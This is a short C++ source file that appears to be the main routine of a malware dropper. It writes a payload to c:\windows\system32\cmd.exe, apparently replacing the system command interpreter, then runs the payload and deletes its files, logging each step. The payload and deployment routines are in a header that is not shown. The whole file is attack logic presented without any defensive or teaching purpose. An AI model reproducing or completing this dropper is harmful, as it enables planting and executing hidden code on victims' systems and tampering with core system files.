
#include <iostream>
#include <filesystem>

#include "utils.hh"
#include "logger.hh"

int main() {

    debug("writing payload to disk..."); // debug message

    deploy::writePayload("c:\\windows\\system32\\cmd.exe"); // writes the payload to disk 

    success("payload successfully wrote to disk!"); // debug message if successful

    debug("running payload..."); // debug message

    if (deploy::runPayload()) { // run the payload and check if it was a success
        success("payload ran successfully!"); // debug message if successful
    }
    else {
        error("fatal error during the execution of the payload."); // debug message if failed
    }

    debug("cleaning up..."); // debug message

    if (deploy::cleanup()) {
        success("cleaned up successfully, closing..."); // clean up the payload files and check if it was a success
    }
    else {
        error("fatal error during the cleanup of the payload."); // debug message if failed 
    }
}